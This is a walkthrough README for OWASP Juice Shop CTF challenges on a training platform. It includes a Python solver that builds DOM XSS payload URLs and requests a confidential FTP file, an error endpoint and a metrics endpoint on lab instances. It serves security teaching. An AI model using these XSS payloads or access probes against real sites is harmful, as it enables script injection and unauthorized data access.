# 🥤 OWASP Juice Shop CTF Challenges - Complete Walkthrough

This directory contains comprehensive walkthroughs and automated solutions for OWASP Juice Shop challenges deployed on the WonkaTech CTF Platform.

## 📚 Table of Contents

### Basic Challenges (⭐)
1. [Score Board](01_score_board.md) - Find the hidden score board
2. [DOM XSS](02_dom_xss.md) - Perform a DOM-based XSS attack
3. [Bonus Payload](03_bonus_payload.md) - Use a special XSS payload
4. [Repetitive Registration](04_repetitive_registration.md) - Register without repeating password
5. [Bully Chatbot](05_bully_chatbot.md) - Get a coupon from the chatbot
6. [Error Handling](07_error_handling.md) - Trigger an error message
7. [Exposed Metrics](08_exposed_metrics.md) - Find the metrics endpoint

### Intermediate Challenges (⭐⭐)
6. [Confidential Document](06_confidential_document.md) - Access confidential files
9. [Missing Encoding](09_12_additional_challenges.md#challenge-9-missing-encoding) - Upload with missing encoding
10. [Outdated Allowlist](09_12_additional_challenges.md#challenge-10-outdated-allowlist) - Exploit outdated redirect list
11. [Privacy Policy](09_12_additional_challenges.md#challenge-11-privacy-policy) - Find the privacy policy
12. [Zero Stars](09_12_additional_challenges.md#challenge-12-zero-stars) - Give a product zero stars

## 🚀 Quick Start

### Prerequisites
```bash
# Install required tools
pip install requests beautifulsoup4
brew install curl jq

# Optional for advanced automation
pip install selenium
```

### Your Instance URLs
Each user gets their own instance:
- Instance 1: `https://juice1.wonkatech.org`
- Instance 2: `https://juice2.wonkatech.org`
- Instance 3: `https://juice3.wonkatech.org`
- ... up to `juice20.wonkatech.org`

## 🛠️ Master Automation Script

Save this as `juice_shop_solver.py`:

```python
#!/usr/bin/env python3
"""
OWASP Juice Shop Challenge Solver
Automates basic challenges for learning purposes
"""

import requests
import json
import time
from urllib.parse import quote

class JuiceShopSolver:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.completed = []
        
    def challenge_01_score_board(self):
        """Find the hidden score board"""
        print("🎯 Challenge 1: Score Board")
        score_board_url = f"{self.base_url}/#/score-board"
        print(f"✅ Score Board at: {score_board_url}")
        self.completed.append("Score Board")
        return score_board_url
    
    def challenge_02_dom_xss(self):
        """Perform DOM XSS attack"""
        print("🎯 Challenge 2: DOM XSS")
        payload = '<iframe src="javascript:alert(`XSS`)">'
        encoded = quote(payload)
        xss_url = f"{self.base_url}/#/search?q={encoded}"
        print(f"✅ XSS URL: {xss_url}")
        self.completed.append("DOM XSS")
        return xss_url
    
    def challenge_03_bonus_payload(self):
        """Use bonus XSS payload"""
        print("🎯 Challenge 3: Bonus Payload")
        payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/"></iframe>'
        encoded = quote(payload)
        bonus_url = f"{self.base_url}/#/search?q={encoded}"
        print(f"✅ Bonus Payload URL: {bonus_url}")
        self.completed.append("Bonus Payload")
        return bonus_url
    
    def challenge_06_confidential_document(self):
        """Access confidential document"""
        print("🎯 Challenge 6: Confidential Document")
        doc_url = f"{self.base_url}/ftp/acquisitions.md"
        response = self.session.get(doc_url)
        if response.status_code == 200:
            print(f"✅ Confidential document accessed: {doc_url}")
            self.completed.append("Confidential Document")
        return doc_url
    
    def challenge_07_error_handling(self):
        """Trigger error handling issue"""
        print("🎯 Challenge 7: Error Handling")
        error_url = f"{self.base_url}/rest/qwertz"
        response = self.session.get(error_url)
        print(f"✅ Error triggered at: {error_url}")
        self.completed.append("Error Handling")
        return error_url
    
    def challenge_08_exposed_metrics(self):
        """Find exposed metrics"""
        print("🎯 Challenge 8: Exposed Metrics")
        metrics_url = f"{self.base_url}/metrics"
        response = self.session.get(metrics_url)
        if response.status_code == 200:
            print(f"✅ Metrics found at: {metrics_url}")
            self.completed.append("Exposed Metrics")
        return metrics_url
    
    def run_all(self):
        """Run all automated challenges"""
        print("🚀 Starting OWASP Juice Shop Challenge Solver")
        print(f"🎯 Target: {self.base_url}\n")
        
        self.challenge_01_score_board()
        time.sleep(1)
        
        self.challenge_02_dom_xss()
        time.sleep(1)
        
        self.challenge_03_bonus_payload()
        time.sleep(1)
        
        self.challenge_06_confidential_document()
        time.sleep(1)
        
        self.challenge_07_error_handling()
        time.sleep(1)
        
        self.challenge_08_exposed_metrics()
        
        print(f"\n📊 Completed {len(self.completed)} challenges:")
        for challenge in self.completed:
            print(f"  ✅ {challenge}")

if __name__ == "__main__":
    # Replace with your instance URL
    INSTANCE_URL = "https://juice3.wonkatech.org"
    
    solver = JuiceShopSolver(INSTANCE_URL)
    solver.run_all()
```

## 🎮 Manual Challenge Guide

### Getting Started
1. Access your Juice Shop instance
2. Open the Score Board first (Challenge 1)
3. Track your progress on the Score Board
4. Use browser DevTools (F12) for most challenges

### Essential Tools
- **Browser DevTools**: Network tab, Console, Elements inspector
- **Proxy Tool**: Burp Suite or OWASP ZAP (optional)
- **cURL**: Command-line HTTP client
- **Python**: For automation scripts

## 📝 Challenge Categories

### 🔍 Reconnaissance
- Score Board - Find hidden functionality
- Exposed Metrics - Discover monitoring endpoints
- Confidential Document - Access restricted files

### 💉 Injection
- DOM XSS - Client-side script injection
- Bonus Payload - Creative XSS payloads
- SQL Injection - Database manipulation (advanced)

### 🔐 Authentication
- Repetitive Registration - Bypass validation
- Bully Chatbot - Social engineering bot

### 🚫 Broken Access Control
- Confidential Document - Access unauthorized files
- Privacy Policy - Find hidden pages

### ⚠️ Security Misconfiguration
- Error Handling - Information disclosure
- Exposed Metrics - Unprotected endpoints

## 🏆 Tips for Success

1. **Always check the Score Board** - It tracks your progress
2. **Use Browser DevTools** - Essential for client-side challenges
3. **Read JavaScript files** - Many secrets hidden in source code
4. **Try multiple methods** - Most challenges have multiple solutions
5. **Check the FTP directory** - Contains many interesting files
6. **Manipulate requests** - Use Burp or browser tools
7. **Think like an attacker** - What would you try to break?

## 🔧 Troubleshooting

### Challenge Not Completing?
- Refresh the Score Board
- Try a different browser
- Clear cookies and try again
- Check if you're logged in (some challenges require auth)

### Can't Access Instance?
- Verify your instance URL (e.g., `https://juice3.wonkatech.org`)
- Check if container is running (may timeout after 10 minutes)
- Log back into the CTF platform to restart your instance

### XSS Not Working?
- Try different payloads (iframe, img, script tags)
- Check browser console for errors
- Some browsers block certain XSS attempts

## 📚 Learning Resources

- [OWASP Juice Shop Official Docs](https://owasp.org/www-project-juice-shop/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [YouTube Playlist - Hacking Juice Shop](https://www.youtube.com/playlist?list=PLcsrjMNFrcmbAFV8BxDKXZCcPrOlaYfWK)

## ⚖️ Legal Notice

These solutions are for educational purposes only. Only use these techniques on systems you have permission to test. The WonkaTech CTF platform provides isolated instances specifically for learning and practice.

## 🎯 Next Steps

After completing these basic challenges:
1. Try the intermediate and hard challenges
2. Learn about SQL injection and authentication bypass
3. Explore admin functionality vulnerabilities
4. Practice with automated tools like Burp Suite
5. Create your own automation scripts

---

Happy Hacking! 🚀

*Remember: The goal is to learn about web security, not just complete challenges.*